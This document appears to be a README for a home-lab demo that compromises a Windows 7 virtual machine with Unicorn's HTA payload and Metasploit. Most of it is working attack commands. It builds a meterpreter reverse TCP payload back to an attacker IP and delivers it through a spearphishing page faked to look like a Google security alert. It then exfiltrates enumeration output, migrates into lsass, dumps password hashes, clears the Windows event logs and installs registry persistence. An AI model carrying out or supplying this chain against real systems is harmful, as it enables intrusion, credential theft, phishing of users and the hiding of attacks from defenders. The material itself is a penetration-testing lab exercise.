# Unicorn Demo 
I have built this to demonstrate attacking a Windows 7 machine using Metasploit and Unicorn's HTA attack.  

## Environment Details

Kali Linux https://www.kali.org/downloads/  
Unicorn https://github.com/trustedsec/unicorn  
Windows 7 ISO en_windows_7_professional_with_sp1_x64_dvd_u_676939.iso https://the-eye.eu/public/MSDN/Windows%207/  
VMware Fusion 11.5 on MacOS Catalina 10.15.2. VirtualBox is a good alternative. 
VMware Fusion 10 had display issues with MacOS Catalina  
**I would NOT reccomend AWS/Azure/GCP as they may detect these activities as malicious** 

## Kali Setup

Download and install the latest Kali Linux 64-Bit Image https://www.kali.org/downloads/  
Once your VM is up and running, login and prepare Metasploit, Apache, and Postgresql for use.

```
apt update  
apt upgrade  
systemctl enable postgresql  
systemctl enable apache2  
systemctl start postgresql  
systemctl start apache2  
msfconsole  
exit
```
Those steps will update Kali, enable postgresql and apache to start automatically, and initialize the Metasploit database.

## Windows 7 Setup
 
Install Window 7s. My testing was done as a trial installation. 
During install I created an administrator account named "admin". If you use a different login you will need to make changes later on.  
If you are testing against an AV solution, ensure your policies are in "Detect Only" mode.  
Upgrade Internet Explorer to version 11 by downloading to your host system and then dragging the exe into your VM  
    Note that Windows 7 lacks the appropriate certificates to browse https sites without this update https://go.microsoft.com/fwlink/?LinkId=324629
Disable UAC. You can do this numerous ways.


## Unicorn Setup

Here I will show you how to grab your IP address, configure Unicorn, and modify options.  
Make note of your IP Address and replace my sample with your IP.  

```
ifconfig 
cd /opt
git clone https://github.com/trustedsec/unicorn.git
cd /opt/unicorn
python unicorn.py windows/meterpreter/reverse_tcp 172.16.105.131 4444 hta
```

If you are not familiar with vi here is a quick guide. https://www.thegeekdiary.com/basic-vi-commands-cheat-sheet/  
Use vi or your favorite text editor to modify the hta_attack/unicorn.rc file.  

```
vi hta_attack/unicorn.rc
```
In vi you can hit `i` to interact, cursor to the attributes, make your changes, hit the `esc` key, and enter `:wq` to save and quit  
Modify the following attributes and save your changes.  
```
AutoVerifySession true
AutoSystemInfo true
AutoLoadStdapi true
```
 
These steps generate the Unicorn HTA payload, copy the payload into apache, and configures the metasploit configuration to support the remaining steps.  
Review the README.md  

```
less /opt/unicorn/README.md
```

## Payload Delivery

While there are multiple ways to deliver the payload I opted to put it into Apache on my Kali VM.

```
cp hta_attack /var/www/html
cd /var/www/html/hta_attack
```

In my case the payload URL is http://172.16.105.131/hta_attack/  
You can launch this page directly and Run/Open the Launcher.hta when prompted, or you can take additional steps for delivery 

## Download JAWS

```
cd /opt
git clone https://github.com/411Hall/JAWS.git
```
'cd /opt' and 'git clone https://github.com/411Hall/JAWS.git'  
Review the README.md  

```
less /opt/JAWS/README.md
```  

## Optional - Adding delivery via SpearPhishing

What I did next was generate a security event warning to my Google email. I copied the email and changed the "Check Activity" URL to the payload URL.  
I also went into my Google account to the Security settings page and saved this page.  
I then edited /var/www/html/hta_attack/index.html and inserted the google code below the existing code making a slight modification to tell users to run the Security Checker tool when prompted.  
It's not perfect but it's good enough to demonstrate a phishing attempt. You could clean this all up to better replicate the FROM address on the email and ensure the page looks exactly like the Google page.

## Download Unicorn Demo

I have select a few commands to run as a script in the meterpreter environment as one way to collect information.  

```
cd /opt
git clone https://github.com/wond696/unicorn-demo.git
```

Review the README.md  

```
less /opt/unicorn-demo/README.md
```  

### Unicorn Demo Assumptions

You can modify this however you want but I found that trying to run everything in the script dies after creating a shell and some commands cause a keyboard buffering problem, so I only do base collection in the script, upload the JAWS powershell script, and make my threat persistent.  

## Update demo.rc

If you are not familiar with vi here is a quick guide. https://www.thegeekdiary.com/basic-vi-commands-cheat-sheet/  
Use vi or your favorite text editor to modify the /opt/unicorn-demo/demo.rc file.  

```
vi /opt/unicorn-demo/demo.rc
```
In vi you can hit `i` to interact, cursor to the IP address, make your changes, hit the `esc` key, and enter `:wq` to save and quit  
Modify the line `run persistence -A -X -p 444 172.16.105.131` to match your Kali VM IP and save your changes.  

## Start the Metasploit listener

Move back to /opt where we will drop our collected file and start the Metasploit listener

```
cd /opt
msfconsole -r /var/www/html/hta_attack/unicorn.rc'  
```

This launches our listener using windows/meterpreter/reverse_tcp on port 4444.

## Launch the attack

Launch the attack by clicking the email link or browsing to http://172.16.105.131/hta_attack/ in Internet Explorer in your Windows 7 VM.  
When prompted, run/open the Launcher.hta.   
This will generate a reverse tcp onto port 4444, you should see the session start.  
Once the session is connected we will interact with that session to collect information, migrate to a SYSTEM process, and clean up our activity leaving a persistent registry key to reconnect on restart.

```
sessions -i
sessions -i 1
run /opt/unicorn-demo/demo.rc
```

That completes the commands in my demo.rc script.  
Next we will interact with the Windows shell, commands must be executed one at a time.

```
shell  
powershell Set-ExecutionPolicy -ExecutionPolicy Unrestricted 
powershell ./jaws-enum.ps1 exfil.txt
```

On your Windows 7 VM watch the C:\Users\Admin folder, when its done exfil.txt should be a little over 100k in size.  

```
exit  
download exfil.txt  
rm jaws-enum.ps1 
rm exfil.txt
```

Next we will look for the pid of the Lsass.exe process and migrate to that.  
If the pid you see when you run `ps` if different use the one you see.
Assuming that works, we should be able finish by performing a hashdump and clear the Windows Event Logs.  

```
run post/windows/manage/migrate
ps  
migrate 592
hashdump
clearev
exit
```

For fun, copy/paste the hashes and see if you can convert them to plaintext in johntheripper or https://crackstation.net/.  
This step may take some additional research on your part.

## Review exlif.txt

```
less /opt/exfil.txt
```

## Results

If you have followed this precisely you should have gathered plenty of system information, have a exfil.txt file in /opt, Launcher.hta should now be persistent by being in the users Start Menu > Startup.  
Reboot your Windows 7 VM to test, it should reconnect as session 2 after you login.

## Cleanup

The final command in demo.rc leaves a randomly generated key name in `HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run`.  
This runs a VBscript that must be deleted before rerunning the demo.rc script.  
This is on purpose as the last command in demo.rc makes the threat persistent on system boot.  
If this registry key exists multiple times or is not removed, you may recieve a VBscript error when you login or run the demo.rc script. 
